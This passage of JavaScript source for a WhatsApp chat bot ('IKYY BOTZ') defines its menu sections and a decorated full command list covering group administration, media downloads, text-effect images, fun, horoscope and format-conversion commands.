"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}grupmenu`
}
]
},
{
"title": "WEBZONE MENU",
"rows": [
{
"title": "WEBZONE MENU",
"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}webzonemenu`
}
]
},
{
"title": "DOWNLOAD MENU",
"rows": [
{
"title": "DOWNLOAD MENU",
"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}downloadmenu`
}
]
},
{
"title": "SEARCH MENU",
"rows": [
{
"title": "SEARCH MENU",
"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}searchmenu`
}
]
},
{
"title": "RANDOM MENU",
"rows": [
{
"title": "RANDOM MENU",
"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}randommenu`
}
]
},
{
"title": "TEKSPRO MENU",
"rows": [
{
"title": "TEKSPRO MENU",
"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}tekspromenu`
}
]
},
{
"title": "PHOTO MENU",
"rows": [
{
"title": "PHOTO MENU",
"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}photomenu`
}
]
},
{
"title": "EPHOTO MENU",
"rows": [
{
"title": "EPHOTO MENU",
"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}ephotomenu`
}
]
},
{
"title": "PHOTOOXY MENU",
"rows": [
{
"title": "PHOTOOXY MENU",
"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}photooxymenu`
}
]
},
{
"title": "FUN MENU",
"rows": [
{
"title": "FUN MENU",
"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}funmenu`
}
]
},
{
"title": "PRIMBON MENU",
"rows": [
{
"title": "PRIMBON MENU",
"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}primbonmenu`
}
]
},
{
"title": "CONVERT MENU",
"rows": [
{
"title": "CONVERT MENU",
"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}convertmenu`
}
]
},
{
"title": "MAIN MENU",
"rows": [
{
"title": "MAIN MENU",
"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}mainmenu`
}
]
},
{
"title": "DATABASE MENU",
"rows": [
{
"title": "DATABASE MENU",
"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}databasemenu`
}
]
},
{
"title": "ANONYMOUS MENU",
"rows": [
{
"title": "ANONYMOUS MENU",
"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}anonymousmenu`
}
]
},
{
"title": "ISLAMIC MENU",
"rows": [
{
"title": "ISLAMIC MENU",
"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}islamicmenu`
}
]
},
{
"title": "VOICE MENU",
"rows": [
{
"title": "VOICE MENU",
"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}voicemenu`
}
]
},
],
listType: 1
}
}), { userJid: m.chat, quoted: m })
ikycoli.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
 case 'ikyallmenu': { 
 anu = `
██▀░░░░░░░░░░░░░▀██
█│░░░░░░░░░░░░░░░│█
▌│░░░░░░░░░░░░░░░│▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░│████▌░░░▐████│░▐
█░│▐██▀░░▄░░▀██▌│░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
╭─────────────────╮
│    ◪〘 GRUP MENU 〙◪
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚗𝚔𝚐𝚛𝚘𝚞𝚙
││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚙𝚑𝚎𝚖𝚎𝚛𝚊𝚕 [𝚘𝚙𝚝𝚒𝚘𝚗]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚐𝚌 [𝚒𝚖𝚊𝚐𝚎]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚗𝚊𝚖𝚎 [𝚝𝚎𝚡𝚝]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚍𝚎𝚜𝚌 [𝚝𝚎𝚡𝚝]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚛𝚘𝚞𝚙 [𝚘𝚙𝚝𝚒𝚘𝚗]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚍𝚒𝚝𝚒𝚗𝚏𝚘 [𝚘𝚙𝚝𝚒𝚘𝚗]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚍𝚍 @𝚞𝚜𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚒𝚌𝚔 @𝚞𝚜𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚒𝚍𝚎𝚝𝚊𝚐 [𝚝𝚎𝚡𝚝]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚊𝚐𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔 [𝚘𝚗/𝚘𝚏𝚏]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚞𝚝𝚎 [𝚘𝚗/𝚘𝚏𝚏]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚛𝚘𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚟𝚘𝚝𝚎 [𝚝𝚎𝚡𝚝]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚟𝚘𝚝𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚞𝚙𝚟𝚘𝚝𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚎𝚔𝚟𝚘𝚝𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚙𝚞𝚜𝚟𝚘𝚝𝚎
╰─────────────────╮
╭─────────────────╯
│ 〘WEBZONE MENU〙
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚕𝚊𝚢𝚜𝚝𝚘𝚛𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚜𝚖𝚊𝚛𝚎𝚗𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚋𝚒𝚘𝚜𝚔𝚘𝚙
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚘𝚠𝚙𝚕𝚊𝚢𝚒𝚗𝚐𝚋𝚒𝚘𝚜𝚔𝚘𝚙
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚖𝚒𝚗𝚒𝚘
││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚝𝚝𝚙𝚊𝚍
││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚎𝚋𝚝𝚘𝚘𝚗𝚜
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚛𝚊𝚔𝚘𝚛
╰─────────────────╮
╭─────────────────╯
│〘DOWNLOAD MENU〙
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚗𝚘𝚠𝚖 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚠𝚖 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚖𝚙3 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛𝚖𝚙3 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝𝚍𝚕 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚖𝚙3 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚖𝚙4 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚎𝚝𝚖𝚞𝚜𝚒𝚌 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚎𝚝𝚟𝚒𝚍𝚎𝚘 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚞𝚖𝚖𝚊 [𝚞𝚛𝚕]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚘𝚘𝚡 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚘𝚞𝚗𝚍𝚌𝚕𝚘𝚞𝚍 [𝚞𝚛𝚕]
╰─────────────────╮
╭─────────────────╯
│ 〘 SEARCH MENU 〙
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚕𝚊𝚢 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚜 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚘𝚘𝚐𝚕𝚎 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚒𝚖𝚊𝚐𝚎 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚕𝚕𝚙𝚊𝚙𝚎𝚛 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚒𝚔𝚒𝚖𝚎𝚍𝚒𝚊 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚜𝚎𝚊𝚛𝚌𝚑 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚒𝚗𝚐𝚝𝚘𝚗𝚎 [𝚚𝚞𝚎𝚛𝚢]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚊𝚕𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗] [𝚚𝚞𝚎𝚛𝚢]
╰─────────────────╮
╭─────────────────╯
│ 〘 RANDOM MENU 〙
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚏𝚏𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚜𝚊𝚗𝚒𝚖𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚘𝚝𝚒𝚟𝚊𝚜𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚒𝚕𝚊𝚗𝚚𝚞𝚘𝚝𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚞𝚌𝚒𝚗𝚚𝚞𝚘𝚝𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚊𝚝𝚊𝚜𝚎𝚗𝚓𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚞𝚒𝚜𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚞𝚙𝚕𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚗𝚒𝚖𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚒𝚏𝚞
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚞𝚜𝚋𝚞
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚔𝚘
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚑𝚒𝚗𝚘𝚋𝚞
││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚒𝚏𝚞𝚜 (𝚗𝚜𝚏𝚠)
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚔𝚘𝚜 (𝚗𝚜𝚏𝚠)
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚛𝚊𝚙 (𝚗𝚜𝚏𝚠)
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚘𝚠𝚓𝚘𝚋 (𝚗𝚜𝚏𝚠)
╰─────────────────╮
╭─────────────────╯
│ 〘 TEKS PRO MENU 〙
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜
││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚍𝚎𝚎𝚙𝚜𝚎𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚖𝚎𝚛𝚒𝚌𝚊𝚗𝚏𝚕𝚊𝚐
││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚜𝚌𝚒𝚏𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚛𝚊𝚒𝚗𝚋𝚘𝚠
││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚠𝚊𝚝𝚎𝚛𝚙𝚒𝚙𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗𝚜𝚔𝚎𝚕𝚎𝚝𝚘𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚔𝚎𝚝𝚌𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚞𝚎𝚌𝚒𝚛𝚌𝚞𝚒𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚙𝚊𝚌𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚎𝚝𝚊𝚕𝚕𝚒𝚌
││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚒𝚌𝚝𝚒𝚘𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚛𝚎𝚎𝚗𝚑𝚘𝚛𝚛𝚘𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚛𝚊𝚗𝚜𝚏𝚘𝚛𝚖𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚎𝚛𝚛𝚢
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚑𝚞𝚗𝚍𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚐𝚖𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚌𝚛𝚊𝚌𝚔𝚎𝚍𝚜𝚝𝚘𝚗𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚖𝚙𝚛𝚎𝚜𝚜𝚒𝚟𝚎𝚐𝚕𝚒𝚝𝚌𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚝𝚞𝚛𝚊𝚕𝚕𝚎𝚊𝚟𝚎𝚜
││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚝𝚛𝚒𝚡
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚛𝚘𝚙𝚠𝚊𝚝𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚘𝚐𝚐𝚢𝚠𝚒𝚗𝚍𝚘𝚠
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚘𝚗𝚍𝚎𝚟𝚒𝚕𝚜
││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜𝚑𝚘𝚕𝚒𝚍𝚊𝚢
││᭄⃟ꪶ⃟•╾ ${prefix}3𝚍𝚐𝚛𝚊𝚍𝚒𝚎𝚗𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚕𝚞𝚎𝚝𝚎𝚡𝚝
╰─────────────────╮
╭─────────────────╯
│〘PHOTO OXY MENU〙
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚑𝚊𝚍𝚘𝚠
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚘𝚖𝚊𝚗𝚝𝚒𝚌
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚖𝚘𝚔𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚞𝚛𝚗𝚙𝚊𝚙𝚙𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚛𝚞𝚝𝚘
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚘𝚟𝚎𝚖𝚜𝚐
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚛𝚊𝚜𝚜𝚖𝚜𝚐
││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚘𝚟𝚎𝚝𝚎𝚡𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚏𝚏𝚎𝚌𝚞𝚙
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚞𝚝𝚝𝚎𝚛𝚏𝚕𝚢
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚝𝚛𝚘𝚕𝚘𝚕
╰─────────────────╮
╭─────────────────╯
│ 〘 EPHOTO MENU 〙
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚏𝚌𝚘𝚟𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚛𝚘𝚜𝚜𝚏𝚒𝚛𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚊𝚕𝚊𝚡𝚢
││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚕𝚊𝚜𝚜
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚘𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚎𝚊𝚌𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚐𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎
╰─────────────────╮
╭─────────────────╯
│    〘 FUN MENU 〙
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚒𝚖𝚒𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚕𝚊𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚒𝚕𝚒𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚞𝚕𝚞𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚎𝚕𝚎𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚘𝚕𝚘𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚘𝚍𝚘𝚑𝚔𝚞
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚝𝚝𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚖𝚒𝚕𝚢100
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚎𝚋𝚊𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚝𝚑 [𝚖𝚘𝚍𝚎]
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚞𝚒𝚝𝚙𝚟𝚙 [@𝚝𝚊𝚐]
╰─────────────────╮
╭─────────────────╯
│ 〘 PRIMBON MENU 〙
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚘𝚖𝚘𝚛𝚑𝚘𝚔𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚛𝚝𝚒𝚖𝚒𝚖𝚙𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚛𝚝𝚒𝚗𝚊𝚖𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑𝚋𝚊𝚕𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚞𝚊𝚖𝚒𝚒𝚜𝚝𝚛𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚊𝚖𝚊𝚕𝚌𝚒𝚗𝚝𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚌𝚘𝚔𝚗𝚊𝚖𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚊𝚜𝚊𝚗𝚐𝚊𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗𝚗𝚒𝚔𝚊𝚑
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚒𝚏𝚊𝚝𝚞𝚜𝚊𝚑𝚊
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚣𝚎𝚔𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚎𝚔𝚎𝚛𝚓𝚊𝚊𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚜𝚒𝚋
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚎𝚗𝚢𝚊𝚔𝚒𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚊𝚛𝚘𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚎𝚗𝚐𝚜𝚑𝚞𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚒𝚋𝚊𝚒𝚔
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚊𝚗𝚐𝚊𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚛𝚒𝚜𝚒𝚊𝚕
││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚊𝚐𝚊𝚑𝚊𝚛𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚛𝚊𝚑𝚛𝚎𝚣𝚎𝚔𝚒
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚎𝚝𝚘𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚊𝚛𝚊𝚔𝚝𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚎𝚋𝚎𝚛𝚞𝚗𝚝𝚞𝚗𝚐𝚊𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚎𝚖𝚊𝚗𝚌𝚒𝚗𝚐
││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚊𝚜𝚊𝚜𝚞𝚋𝚞𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚣𝚘𝚍𝚒𝚊𝚔
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚑𝚒𝚘
╰─────────────────╮
╭─────────────────╯
│ 〘 CONVERT MENU 〙
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚝𝚝𝚙
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚝𝚙
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚒𝚖𝚊𝚐𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚖𝚘𝚟𝚎𝚋𝚐
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚒𝚌𝚔𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡
││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚖𝚘𝚓𝚒𝚖𝚒𝚡2
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚟𝚒𝚍𝚎𝚘
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚐𝚒𝚏
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚞𝚛𝚕
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚟𝚗
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚖𝚙3
││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚊𝚞𝚍𝚒𝚘
││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚋𝚒𝚗𝚊𝚛𝚢
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚋𝚒𝚗𝚊𝚛𝚢
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚢𝚕𝚎𝚝𝚎𝚡𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚖𝚎𝚖𝚎
╰─────────────────╮
╭─────────────────╯
│   〘 MAIN MENU 〙
╰─────────────────╮
╭─────────────────╯
││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚒𝚗𝚐
││᭄⃟ꪶ⃟•╾ ${prefix}𝚘𝚠𝚗𝚎𝚛
││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚎𝚗𝚞 / 𝚑𝚎𝚕𝚙 / ?
││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚎𝚝𝚎
││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚗𝚏𝚘𝚌𝚑𝚊𝚝
││᭄⃟ꪶ⃟•╾ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚍
